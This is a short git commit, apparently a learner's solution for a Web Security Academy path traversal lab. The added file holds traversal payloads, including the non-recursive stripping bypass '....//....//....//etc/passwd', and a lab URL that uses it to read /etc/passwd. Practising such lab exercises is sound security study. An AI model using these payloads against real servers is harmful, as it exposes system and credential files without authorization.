db6bc7533a517baf43b7c2c6f5ea55d76e9632c1
Pranjal <pranjalruhela2811@gmail.com>
2023-07-08 10:25:13 +0530

    recursive traversal sequence was allowed

---
+++ FilePathTraversal/traversal sequences stripped non-recursively/payload.js
@@ -0,0 +1,10 @@
+/*
+/etc/passwd
+../../../etc/passwd
+we need take 3 steps back in the filesystem
+....// (one)
+....//....// (two)
+....//....//....// (three)
+....//....//....//etc/passwd
+https://0ae300fc03e59a1a80423a2f00050068.web-security-academy.net/image?filename=....//....//....//etc/passwd
+*/
